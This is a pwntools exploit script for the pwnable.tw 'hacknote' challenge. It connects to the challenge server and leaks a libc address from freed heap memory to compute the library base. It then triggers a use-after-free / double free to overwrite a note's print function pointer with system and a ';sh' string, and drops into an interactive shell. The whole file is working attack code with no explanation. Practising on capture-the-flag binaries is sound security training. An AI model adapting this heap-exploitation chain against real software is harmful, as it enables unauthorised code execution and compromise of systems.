from pwn import *

e = ELF("./hacknote")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = e
context.terminal = ["konsole", "-e"]

#p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})
p = remote("chall.pwnable.tw", 10102)


context.log_level="debug"
gdb.attach(p, """c""")



def add(size, content):
    p.sendlineafter(":", "1")
    p.sendlineafter(":", str(size))
    p.sendafter(":", content)
    
    

def remove(idx):
    p.sendlineafter(":", "2")
    p.sendlineafter(":", str(idx))



def view(idx):
    p.sendlineafter(":", "3")
    p.sendlineafter(":", str(idx))




add(0x500, "BBBBBBBBBBBBBBB")
add(10, "A")

remove(0)

add(0x500, "BBBB")

view(0)

p.recv(4)

libc.address = u32(p.recv(4)) - 0x1b07b0

og = libc.address + 0x3a819
binsh = next(libc.search("/bin/sh"))

pndw = 0x0804862b

print("libc base", hex(libc.address))
print("libc system", hex(libc.sym["system"]))
print("libc og", hex(og))
print("libc binsh", hex(binsh))
print("libc __free_hook", hex(libc.sym["__free_hook"]))
print("libc __malloc_hook", hex(libc.sym["__malloc_hook"]))

print({k : hex(v) for k, v in e.got.items()})


remove(1)
remove(1)

remove(0)


add(12, p32(libc.sym["system"]) + ";sh\x00")


view(1)



p.interactive()
